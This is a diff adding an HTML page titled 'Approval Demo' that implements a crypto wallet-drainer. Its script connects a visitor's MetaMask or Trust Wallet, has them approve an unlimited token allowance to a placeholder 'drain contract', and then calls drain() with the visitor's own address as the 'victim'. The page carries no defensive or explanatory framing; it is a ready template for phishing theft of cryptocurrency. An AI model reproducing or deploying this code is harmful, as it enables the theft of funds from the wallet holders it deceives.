@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Approval Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+</head>
+<body style="font-family:sans-serif">
+
+<h2>Demo: Connect → Approve → Drain</h2>
+
+<button onclick="connect()">Connect Wallet</button><br><br>
+
+<button onclick="approve()">Approve Token</button><br><br>
+
+<button onclick="drain()">Drain Tokens</button>
+
+<script>
+let provider, signer;
+
+const tokenAddress = "YOUR_TOKEN_ADDRESS";
+const drainAddress = "YOUR_DRAIN_CONTRACT";
+
+const tokenABI = [
+  "function approve(address spender, uint256 amount) public returns (bool)"
+];
+
+const drainABI = [
+  "function drain(address token, address victim, uint256 amount) public"
+];
+
+async function connect() {
+  if (!window.ethereum) {
+    alert("Open this inside Trust Wallet or MetaMask browser");
+    return;
+  }
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  alert("Wallet connected");
+}
+
+async function approve() {
+  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+  const tx = await contract.approve(drainAddress, ethers.constants.MaxUint256);
+  await tx.wait();
+  alert("Approved");
+}
+
+async function drain() {
+  const contract = new ethers.Contract(drainAddress, drainABI, signer);
+  const victim = await signer.getAddress();
+  const tx = await contract.drain(tokenAddress, victim, ethers.utils.parseUnits("1000", 18));
+  await tx.wait();
+  alert("Drain called");
+}
+</script>
+
+</body>
+</html>
